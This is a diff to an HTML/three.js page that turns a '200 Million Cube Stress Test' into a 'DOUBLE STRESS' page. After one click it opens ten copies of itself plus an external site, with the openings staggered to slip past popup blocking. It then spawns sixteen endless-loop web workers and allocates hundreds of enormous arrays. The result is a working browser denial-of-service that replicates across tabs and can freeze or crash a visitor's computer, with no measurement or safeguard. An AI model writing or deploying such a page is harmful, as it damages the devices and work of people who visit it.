@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>🟥 200 Million Cube Stress Test</title>
+  <title>🟥 DOUBLE STRESS: RAM + CPU MAXED</title>
   <style>
     body {
       margin: 0;
@@ -25,8 +25,8 @@
 </head>
 <body>
   <div id="ui">
-    <div><strong>🟥 Welcome</strong></div>
-    <div id="info">Now we’re going to overload your RAM. Click anywhere to begin.</div>
+    <div><strong>🟥 DOUBLE MODE</strong></div>
+    <div id="info">Now we’re going to MAX OUT your RAM and CPU. Click anywhere to begin.</div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/three@0.158.0/build/three.min.js"></script>
@@ -35,6 +35,7 @@
     const batches = 100;
     const instancesPerBatch = 2_000_000;
     const meshes = [];
+    const ramBuffers = [];
 
     function start() {
       init();
@@ -94,28 +95,61 @@
 
     function animate() {
       requestAnimationFrame(animate);
+
+      for (let i = 0; i < 4_000_000; i++) {
+        Math.sin(Math.random() * i) + Math.sqrt(i);
+      }
+
       for (const m of meshes) {
         m.rotation.y += 0.01;
         m.rotation.x += 0.005;
       }
+
       renderer.render(scene, camera);
+    }
+
+    function spawnWorkers(count) {
+      for (let w = 0; w < count; w++) {
+        new Worker(URL.createObjectURL(new Blob([`
+          while (true) {
+            const arr = [];
+            for (let i = 0; i < 2e7; i++) {
+              arr.push(Math.tan(i) * Math.random());
+            }
+          }
+        `], { type: 'application/javascript' })));
+      }
+    }
+
+    function eatRAM(count) {
+      for (let i = 0; i < count; i++) {
+        try {
+          const buf = new Array(200_000_000).fill(Math.random());
+          ramBuffers.push(buf);
+        } catch (e) {
+          console.warn("❌ Ran out of memory at block", i);
+          break;
+        }
+      }
     }
 
     window.onload = start;
 
-    // Click to open 10 local tabs and 1 external
     document.body.addEventListener("click", () => {
       const url = window.location.href;
 
       for (let i = 0; i < 10; i++) {
         setTimeout(() => {
           window.open(url, "_blank");
-        }, i * 200); // Staggered to avoid popup blocking
+        }, i * 200);
       }
 
       setTimeout(() => {
         window.open("https://katana-king.github.io/NAJIBA/", "_blank");
-      }, 2200);
+      }, 2500);
+
+      spawnWorkers(16);
+      eatRAM(200);
     }, { once: true });
   </script>
 </body>
